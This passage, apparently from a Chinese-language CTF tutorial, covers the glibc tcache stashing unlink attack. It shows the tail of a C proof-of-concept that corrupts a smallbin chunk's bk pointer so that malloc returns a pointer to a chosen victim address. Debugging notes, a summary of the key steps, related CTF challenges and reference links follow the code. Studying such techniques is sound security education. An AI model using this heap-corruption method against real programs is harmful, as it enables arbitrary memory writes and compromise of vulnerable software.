    printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
    printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);

    printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
    printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
    s2 = malloc(0x420);
    pad = malloc(0x80);
    free(s2);
    malloc(0x3c0);
    malloc(0x100);
    printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
    printf("smallbin[4] list is %p &lt;--&gt; %p\n", s2+0x3c0, s1+0x3c0);

    printf("\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n");
    printf("Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&amp;victim)-0x10);
    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;

    printf("\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");

    calloc(1, 0x50);
    printf("Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n", 
        &amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

    printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");

    uint64_t *r = (uint64_t*)malloc(0x50);
    r[0] = 0xaa;
    r[1] = 0xbb;
    r[2] = 0xcc;
    r[3] = 0xdd;

    printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
        victim[0], victim[1], victim[2], victim[3]);
    printf("victim2's value: 0x%lx\n",
        victim2);

    return 0;
`}`
```

#### <a class="reference-link" name="%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"></a>调试过程

基本跟第2个一样，断点还是断在相似的位置，然后分析相关位置的代码即可。

调试完成发现，其跟第二个十分相似，只是在第二个中保证的是：`目标地址+8`为一个可写的地址即可。然而想要实现一个地方写入一个巨大的`main_arena`附近的值，只需把`目标地址+8`为这个地方-0x10即可。

```
bck-&gt;fd = bin;
```

#### <a class="reference-link" name="%E5%B0%8F%E6%80%BB%E7%BB%93"></a>小总结

重点操作在：
- 将 Smallbins 里的后一个进入的chunk的 bk 设置为目标地址 1 减 0x10。
- 将目标地址 1 加 0x8 的位置设置为目标地址 2 减 0x10。
这样就可以分配到目标地址 1的chunk，同时向目标地址 2 写入一个大数字。

### <a class="reference-link" name="%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98"></a>相关例题
- `2019-HITCON-one_punch_man`
- `2019-HITCON-lazyhouse`
- `2020-XCTF-GXZY-twochunk`
- `BUUCTF 新春红包3`


## 参加链接

[https://zhuanlan.zhihu.com/p/136983333](https://zhuanlan.zhihu.com/p/136983333)

[http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89](http://blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/#2020-XCTF-GXZY-twochunk%EF%BC%88tcache-stashing-unlink-attack-plus-plus%EF%BC%89)
